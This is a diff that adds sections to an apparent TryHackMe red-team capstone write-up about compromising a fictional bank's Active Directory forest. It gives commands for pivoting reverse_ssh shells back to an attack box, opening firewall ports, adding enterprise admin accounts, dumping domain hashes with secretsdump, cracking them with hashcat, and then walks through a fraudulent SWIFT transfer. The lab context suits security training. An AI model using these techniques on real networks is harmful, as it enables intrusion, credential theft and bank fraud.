@@ -87,6 +87,15 @@ To set up reverse_ssh from the Try Hack Me attack box, the following commands we
   
 With the above, this sets up the server to listen on the VPN's local IP, port 443 (which is less likely to be blocked by firewalls, though that wasn't universally the case here). Additionally, the client binaries (a windows `client.exe` and a linux `client`) were copied to the home directory of the current user, ready to be uploaded to targets.
 
+In this network, different segments were unable to reach other segments. Notably, from CORP only WRK1 and WRK2 could reach the attack box over the VPN, and only the root DC could see WRK1 and WRK2, nothing from the BANK domain. The way the connection back to the reverse_ssh server was propagated was via SSH remote forwarding:
+
+- once a client connection was done on a server, it became possible to perform SSH remote forwarding.
+- a command like `ssh -J localhost:443 -R 10.200.116.21:443:localhost:443 [.21_CLIENT_ID]` was run, which exposed the local server port on the target machine on 443.
+- Usually this also required making that port reachable on the target, by running a firewall command: `New-NetFirewallRule -DisplayName "Required Port" -Direction inbound -Profile Any -Action Allow -LocalPort 443 -Protocol TCP`
+- When the client was run on a later machine, it would be run like `.\client.exe -d 10.200.116.21:443`, to forward its connection through the remote port and back to the attack box.
+
+As the new connection was created, the process could be repeated to extend the reverse_ssh network through the AD forest.
+
 ## Stage 1: OSINT of the external interfaces, and getting a foothold
 
 On top of the access to the network, a `password_base_list.txt` and `password_policy.txt` were provided. The policy stated:
@@ -199,6 +208,27 @@ Note the use of -519 at the end of the ROOT_SID - this is the SID of the enterpr
 To gain remote command execution, [PsExec from Systools](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) was used: `.\PsExec.exe -accepteula \\rootdc.thereserve.loc cmd`, which opened a command shell. To complete the compromise, a user was created (`net user aquinas [REDACTED] /add` again), and added to the enterprise admins group directly with `net group "Enterprise Admins" aquinas /add`. The consultant could then remote desktop direct to the root domain controller, proving compromise of the entire forest.
 
 ## Stage 4: Access to the Swift system and demonstrating impact
+
+With an enterprise admin user it was possible to remote directly to the BANKDC domain controller in the bank domain. After gaining access, another user was added as before and explicitly added to the domain admins group for the bank domain. With this new user all machines were accesable, and it was also possible to perform a DC sync: `proxychains python3.9 /opt/impacket/examples/secretsdump.py -just-dc aquinas:[REDACTED]@10.200.116.101`. Note that in order to do this, a reverse_ssh client connection was propagated through to the bank domain using remote port forwarding as described above. This gave all hashes for the bank domain.
+
+The server `jmp.bank.thereserve.loc` was the only machine capable of accessing the http://swift.bank.thereserve.loc website, and this machine had two users under its user folder: a.holt and a.turner. The password hash for a.turner could be cracked with `hashcat -m 1000 hash rockyou.txt`, though as domain admin their passwords could also simply be changed. Logging on as these users and opening up the website in the Chrome browswer revealed both users had saved their credentials for the system in Chrome's password manager - these passwords could be recovered via the Password Manager interface. Both a.holt and a.turner had the 'approval' role within Swift.
+
+To perform a transaction and demonstrate impact, in addition to the accounts provided by The Reserve bank's security team, the consultant needed access to both capturers and approvers. To find a capturer account, other machines in the bank domain were connected to and enumerated. On WORK2 the user c.young had a note in their document's folder saying they were a capturer, and that their password in Swift was the same as their AD password. Their hash was the same as a.turner's indicating they shared the same AD password and so the consultant was able to log in as c.young.
+
+In summary, to perform a swift transaction from the JMP server, the consultant gathered:
+
+- a source account and destination account provided by the security team, Aquinas@source.loc and Aquinas@destination.loc respectively
+- a capturer account, c.youn@bank.thereserve.loc
+- an approver account, a.turner@bank.thereserve.loc
+
+They were then able to:
+
+1. issue a transaction using the account IDs for their created accounts
+2. collect the PIN sent to their email and verify the transaction in the interface
+3. log in as a capturer and forward the transaction
+4. log in as an approver and approve the transaction
+
+In so doing, the complete compromise of the network and the banks financial security was proved.
 
 ## Summary & Recommendations
 
